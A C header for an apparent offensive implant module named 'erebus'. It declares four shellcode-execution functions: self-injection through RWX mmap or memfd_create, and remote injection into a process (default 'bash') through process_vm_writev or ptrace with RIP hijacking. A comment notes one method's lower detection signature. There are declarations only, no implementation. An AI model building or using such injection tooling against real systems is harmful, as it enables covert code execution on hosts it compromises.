#pragma once
#include <stddef.h>

/* Anonymous mmap(RWX) + pthread_create. Self-inject, no external deps. */
void erebus_mmap_thread(const unsigned char *sc, size_t sc_len);

/* memfd_create file-backed mapping (appears as /memfd: in /proc/maps).
 * Kernel >= 3.17. Self-inject, lower anon-RWX signature. */
void erebus_memfd_exec(const unsigned char *sc, size_t sc_len);

/* process_vm_writev into a remote process + ptrace RIP hijack.
 * Target process name set via CONFIG_TARGET_PROCESS (default: "bash"). */
void erebus_process_vm(const unsigned char *sc, size_t sc_len);

/* ptrace POKEDATA into a remote process + RIP hijack.
 * Fallback for kernels that restrict process_vm_writev. */
void erebus_ptrace_inject(const unsigned char *sc, size_t sc_len);
